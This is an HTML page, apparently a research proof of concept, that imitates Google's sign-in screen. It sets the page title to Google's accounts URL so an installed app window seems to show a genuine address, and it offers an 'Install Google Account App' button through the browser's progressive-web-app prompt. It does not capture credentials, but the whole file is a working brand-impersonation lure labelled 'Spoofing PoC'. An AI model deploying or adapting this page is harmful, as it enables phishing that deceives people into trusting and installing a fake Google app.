<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>https://accounts.google.com/</title>
  <link rel="manifest" href="./manifest.json">
  <meta name="theme-color" content="#ffffff">
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: 'Google Sans', Roboto, Arial, sans-serif;
      background: #f1f3f4;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    .card {
      background: #fff;
      width: 360px;
      padding: 48px 40px 36px;
      border-radius: 8px;
      box-shadow: 0 2px 10px rgba(0,0,0,.12);
      text-align: center;
    }
    .logo { width: 75px; margin-bottom: 16px; }
    h1 { font-size: 24px; font-weight: 400; color: #202124; margin-bottom: 8px; }
    .subtitle { font-size: 16px; color: #202124; margin-bottom: 24px; }
    .hint { font-size: 14px; color: #5f6368; margin-bottom: 24px; }
    .input-wrap { margin-bottom: 16px; text-align: left; }
    label { font-size: 12px; color: #5f6368; display: block; margin-bottom: 4px; }
    input {
      width: 100%;
      padding: 13px 15px;
      font-size: 16px;
      border-radius: 4px;
      border: 1px solid #dadce0;
      outline: none;
      color: #202124;
      transition: border-color .15s;
    }
    input:focus { border-color: #1a73e8; border-width: 2px; }
    .forgot { display: block; text-align: left; font-size: 14px; color: #1a73e8; text-decoration: none; margin-bottom: 28px; }
    .forgot:hover { text-decoration: underline; }
    .actions {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-top: 8px;
    }
    .create-account { font-size: 14px; color: #1a73e8; text-decoration: none; }
    .create-account:hover { text-decoration: underline; }
    .next-btn {
      background: #1a73e8;
      color: #fff;
      border: none;
      padding: 10px 24px;
      font-size: 14px;
      font-weight: 500;
      border-radius: 4px;
      cursor: pointer;
      letter-spacing: .25px;
    }
    .next-btn:hover { background: #1557b0; box-shadow: 0 1px 3px rgba(0,0,0,.3); }
    .install-btn {
      display: none;
      width: 100%;
      margin-top: 20px;
      background: #34a853;
      color: #fff;
      border: none;
      padding: 11px;
      font-size: 14px;
      font-weight: 500;
      border-radius: 4px;
      cursor: pointer;
      letter-spacing: .25px;
    }
    .install-btn:hover { background: #2d8f48; }
    .divider {
      border: none;
      border-top: 1px solid #e0e0e0;
      margin: 28px 0 16px;
    }
    .footer { font-size: 12px; color: #5f6368; }
  </style>
</head>
<body>
  <div class="card">
    <img src="./google.png" alt="Google" class="logo">
    <h1>Sign in</h1>
    <p class="subtitle">Use your Google Account</p>

    <div class="input-wrap">
      <input type="email" id="email" placeholder="Email or phone" autocomplete="email">
    </div>
    <a href="#" class="forgot">Forgot email?</a>

    <div class="hint">Not your computer? Use a Private Window to sign in.</div>

    <div class="actions">
      <a href="#" class="create-account">Create account</a>
      <button class="next-btn" onclick="return false;">Next</button>
    </div>

    <hr class="divider">

    <button class="install-btn" id="install-btn" onclick="triggerInstall()">
      Install Google Account App
    </button>

    <div class="footer" style="margin-top:16px;">Spoofing PoC — Research Only</div>
  </div>

  <script>
    // ── Service Worker ──────────────────────────────────────────────────────────
    if ('serviceWorker' in navigator) {
      window.addEventListener('load', () => {
        navigator.serviceWorker.register('./sw.js', { scope: './' })
          .then(reg  => console.log('[SW] Registered, scope:', reg.scope))
          .catch(err => console.error('[SW] Registration failed:', err));
      });
    }

    // ── PWA Install Prompt ──────────────────────────────────────────────────────
    let deferredPrompt = null;

    window.addEventListener('beforeinstallprompt', (e) => {
      e.preventDefault();
      deferredPrompt = e;
      document.getElementById('install-btn').style.display = 'block';
      console.log('[PWA] beforeinstallprompt captured');
    });

    function triggerInstall() {
      if (!deferredPrompt) {
        console.warn('[PWA] No deferred prompt available');
        return;
      }
      deferredPrompt.prompt();
      deferredPrompt.userChoice.then((choice) => {
        console.log('[PWA] User choice:', choice.outcome);
        deferredPrompt = null;
        document.getElementById('install-btn').style.display = 'none';
      });
    }

    window.addEventListener('appinstalled', () => {
      console.log('[PWA] App installed');
      deferredPrompt = null;
    });
  </script>
</body>
</html>
